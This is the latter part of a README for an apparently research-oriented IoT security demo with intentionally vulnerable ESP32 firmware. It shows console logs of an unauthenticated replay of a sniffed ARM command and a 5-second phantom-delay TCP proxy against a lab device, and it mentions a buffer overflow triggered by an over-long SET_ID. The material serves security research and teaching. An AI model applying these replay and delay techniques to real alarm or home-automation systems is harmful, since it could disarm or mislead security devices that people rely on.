  |  Suite 2 — NETWORK ATTACK: Protocol Replay                     |
  |  Target: 192.168.1.112:15011  |  CWE-294 / CVSS 8.1           |
  +----------------------------------------------------------------+

  Captured command (sniffed from wire):  ARM

  -- Step 1 — Reset device to known DISARMED state -------------------
  [+ 0.001s] -> HUB:    DISARM
  [+ 0.180s] <- ESP32:  ARMED:no   < device is DISARMED
                         ACK

  +================================+
  |  Device State: DISARMED        |
  +================================+

  -- Step 2 — Replay captured ARM packet 3x (no credentials) --------

  Replay #1:
  [+ 0.510s] -> HUB:    ARM
  [+ 0.690s] <- ESP32:  ARMED:yes   < device is ARMED
                         ACK
  ACCEPTED — device changed state without authentication

  +================================+
  |  Device State: ARMED           |
  +================================+

  Replay #2:
  [+ 1.110s] -> HUB:    ARM
  [+ 1.290s] <- ESP32:  ARMED:yes   < device is ARMED
  ACCEPTED

  Replay #3:
  [+ 1.710s] -> HUB:    ARM
  [+ 1.890s] <- ESP32:  ARMED:yes   < device is ARMED
  ACCEPTED

  -- Step 3 — Confirm final device state -----------------------------
  [+ 2.100s] <- ESP32:  ARMED:yes   < device is ARMED

[2/3] Result — Protocol Replay Attack
  Severity: HIGH  (CVSS 8.1)
  Status:   SUCCESS
  Evidence:
    1. Captured from wire: 'ARM\n'  (no nonce / timestamp)
    2. VESPER protocol has no replay protection in any firmware version
    3. Device state before replay: ARMED:no
    4. Replay #1 ACCEPTED — 'ARMED:yes  ACK'
    5. Replay #2 ACCEPTED — 'ARMED:yes  ACK'
  Impact:   3/3 replays accepted — attacker re-triggers any past command
  Duration: 2450ms

  +----------------------------------------------------------------+
  |  Suite 3 — RELAY / PHANTOM-DELAY ATTACK  (Fu et al. DSN 2022)  |
  |  Proxy: 127.0.0.1:16011 -> 192.168.1.112:15011  |  Delay: 5s  |
  +----------------------------------------------------------------+

  How it works:
    Commands (HUB -> ESP32) pass through the proxy instantly.
    State-change responses (ARMED: SWITCH: MOTION:) are held 5s.

  -- Step 1 — Start transparent TCP proxy ----------------------------
  [+ 0.301s] Proxy listening:  127.0.0.1:16011
  [+ 0.302s] Upstream target:  192.168.1.112:15011
  [+ 0.302s] Delay filter:     ARMED:  SWITCH:  EVENT:MOTION  OVERFLOW:

  -- Step 2 — Hub connects through proxy (hub sees normal banner) ----
  [+ 0.510s] <- proxy->HUB (not delayed):  BOOTED
                                            DEVICE:VESPER_ESP32_MOTION
                                            READY
  Banner passes through instantly — hub cannot tell a proxy is present.

  -- Step 3 — Hub sends ARM through proxy ----------------------------
  [+ 0.520s] -> HUB:  via proxy @ 127.0.0.1:16011    ARM
  -> proxy forwarded ARM to ESP32 instantly
  <- ESP32 responded ARMED:yes immediately (proxy captures and holds it)

  Proxy intercepted ARMED:yes response — holding for 5s ...
      Hub world-model: [ DISARMED ]  <- STALE  (device is actually ARMED)

  [============================] 5.0s / 5s  (100%)  hub sees: DISARMED

  -- Step 4 — Response delivered to hub after 5.0s -------------------
  [+ 5.530s] <- proxy->HUB (released after delay):  ARMED:yes
                                                     ACK
  +================================+
  |  Device State: ARMED           |
  +================================+

  Stale-state window was 5.0s
     Automation rules that ran during those 5.0s saw DISARMED (incorrect).

[3/3] Result — Relay / Phantom-Delay (TCP proxy, Fu et al. DSN 2022)
  Severity: CRITICAL  (CVSS 9.3)
  Status:   SUCCESS
  Evidence:
    1. Proxy active: 127.0.0.1:16011 -> 192.168.1.112:15011
    2. Intercepting: ARMED:, SWITCH:, EVENT:MOTION, OVERFLOW:
    3. ARM sent at t=0
    4. ARMED:yes arrived after 5.0s  (proxy held it 5s)
    5. Intercepted+delayed: 'ARMED:yes  ACK'  +5s
  Impact:   State events delayed 5s — automation fires 5s late.
  Duration: 5271ms

======================================================================
  ATTACK SUMMARY
======================================================================
  Total Attacks:   3
  Successful:      3
  Failed:          0
  Success Rate:    100%

  By Suite  (mirrors the 3 suites in the 30-scene evaluation):
    Suite 1 — Firmware                        CVSS 7.5  SUCCESS
    Suite 2 — Network                         CVSS 8.1  SUCCESS
    Suite 3 — Relay/Phantom-Delay             CVSS 9.3  SUCCESS
======================================================================

TIP: Watch the M5Stack LCD during attacks!
   - Yellow text: received commands
   - Green/Red panels: ARM / DISARM state
   - Purple panel: buffer overflow detected
   - Orange flash: motion detected (shake the device!)
```

---

## Connection to the 30-Scene Evaluation

The big evaluation (`scripts/run_autonomous_eval.py --num-scenes 30 --num-days 7`) runs:

| Suite | Scale | Targets | This demo |
|-------|-------|---------|-----------|
| Firmware (`firmware_attacks.py`) | 18 attacks x 30 scenes | Docker/QEMU ARM containers | 1 representative (info disclosure) |
| Network (`network_attacks.py`) | 14 attacks x 30 scenes | MQTT broker + Docker containers | 1 representative (replay) |
| Phantom-Delay (`phantom_delay_attack.py`) | 3 variants x 30 scenes | Docker/QEMU containers | Full mechanism on physical ESP32 |

The ESP32 runs the same VESPER protocol and the same intentional vulnerabilities.
The attack scripts (`scripts/attacks/firmware.py`, `network.py`, `relay.py`) are
standalone — they do **not** import the main evaluation modules. They reimplement
the three representative attacks directly over raw TCP so they work against the
physical device without Docker, QEMU, or any infrastructure dependencies.

---

## M5Stack LCD Reference

| Display | Meaning |
|---------|---------|
| Green panel `ARMED` | Device is armed (motion detection active) |
| Red panel `DISARMED` | Device is disarmed |
| Purple panel `OVERFLOW!` | Buffer overflow received (SET_ID with >15 chars) |
| Orange bar `MOTION DETECTED!` | IMU threshold exceeded — real shake triggered |
| Green bar `CLIENT CONNECTED` | TCP client connected |
| Yellow bar `CMD: <command>` | Last command received from attacker |

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| "Board M5Stack-Core-ESP32 not found" | Select **ESP32 Dev Module** under ESP32 Arduino |
| Compile error `digitalPinToGPIONumber` | Wrong board selected — must be ESP32 Dev Module, not Arduino Nano ESP32 |
| `rom/miniz.h not found` | Wrong library — install **M5Unified**, not the old M5Stack library |
| Upload hangs at "Connecting..." | Hold left M5Stack button during upload |
| Upload fails at 921600 baud | Set Tools -> Upload Speed -> **115200** |
| WiFi fails (`WiFi Failed!` on LCD) | Check SSID/password, ensure 2.4 GHz network |
| `Connection timeout` | Check IP address on LCD, try `ping 192.168.1.XXX` |
| Suite 3 proxy hangs | Port 16011 in use — kill it: `lsof -ti:16011 \| xargs kill` |
| `ModuleNotFoundError: scripts.attacks` | Run from the project root: `cd /path/to/vesper` |

---

## Safety Note

This firmware is **intentionally vulnerable** for security research and education.
Never deploy it in a production environment.
Attacks should only be run against devices you own on a network you control.
